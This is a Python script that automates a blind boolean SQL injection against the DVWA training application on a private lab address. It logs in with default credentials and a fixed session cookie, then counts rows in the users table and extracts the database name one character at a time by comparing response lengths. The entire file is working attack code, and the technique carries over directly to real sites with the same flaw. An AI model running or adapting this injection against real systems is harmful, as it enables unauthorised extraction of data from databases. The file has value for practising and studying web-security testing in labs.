import requests

vulnerable_machine = "192.168.1.104"

# Set the URL of the website that you want to scan
url = f"http://{vulnerable_machine}/dvwa/vulnerabilities/sqli_blind/?id=1"

# Set the name of the table that you want to count the rows of
table = "users"

# Set the maximum number of rows that you want to test for
max_rows = 1000

# Set the login credentials for the website
login_url = f"http://{vulnerable_machine}/dvwa/login.php"
username = "admin"
password = "password" 

def get_row(cookies):
    # Iterate over the range of rows that you want to test
    for row in range(1, max_rows):

        # Set the base query that you want to use for the injection
        query = f"' AND (SELECT COUNT(*) FROM {table})={row}-- -"
        # Construct the injection query by inserting the current row number into the base query

        # Send the injection query to the website

        c.post(login_url, headers=headers, data=payload, cookies=cookies)
        r = c.get(url + query + "&Submit=Submit#")
        content_length = len(r.content)

        # If the content_length is greater than the default_length, it means that the injection was successful
        if content_length != default_length:
            return row 

#1' and substring((select database()),1,1) = 'd' -- -
def get_database_name(cookies):
    database_length = 0
    for i in range(1,25):
        query = f"' and length(substr((select database()),1)) = {i} -- -"
        c.post(login_url, headers=headers, data=payload, cookies=cookies)
        r = c.get(url + query + "&Submit=Submit#")
        content_length = len(r.content)
        if content_length != default_length:
            database_length = i
            break
    dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
    database_name = ""
    for i in range(1,(database_length+1)):
        for d in dictionary:
            query = f"' and substring((select database()),{i},1) = '{d}' -- -"
            c.post(login_url, headers=headers, data=payload, cookies=cookies)
            r = c.get(url + query + "&Submit=Submit#")
            content_length = len(r.content)
            if content_length != default_length:
                database_name +=d 
                break
    return database_name


if __name__ == "__main__":
    payload = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '44'
    }
    cookies = dict(security='low', PHPSESSID='ff6cf096941ba49f8d39458511f26483')
    # Log in to the website
    with requests.Session() as c:
            c.cookies.update(cookies)
            c.post(login_url, headers=headers, data=payload, cookies=cookies)
            response = c.get(url)
            default_length = len(response.content)

    row = get_row(cookies)
    print(f"Number of rows in table {table}: {row}")
    database_name = get_database_name(cookies)
    print("Database Name:",database_name)